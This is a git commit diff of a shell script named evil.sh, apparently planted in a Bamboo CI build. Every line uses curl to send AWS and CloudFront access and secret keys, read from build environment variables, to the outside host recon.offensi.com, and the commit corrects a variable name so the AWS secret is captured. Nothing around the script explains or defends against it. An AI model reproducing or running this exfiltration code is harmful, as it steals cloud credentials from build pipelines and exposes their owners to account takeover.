523cbd767543fcf5003dddbc757e9beacdc9c899
root <root@recon.offensi.com>
2019-05-07 17:06:49 +0200

    pompom

--- evil.sh
+++ evil.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 curl http://recon.offensi.com/`echo aws:$bamboo_aws_access_key_password`
-curl http://recon.offensi.com/`echo aws:$aws_secret_access_key_password`
+curl http://recon.offensi.com/`echo aws:$bamboo_aws_secret_access_key_password`
 
 curl http://recon.offensi.com/`echo market:$bamboo_market_cloudfront_access_key_password`
 curl http://recon.offensi.com/`echo market:$bamboo_market_cloudfront_secret_key_password`
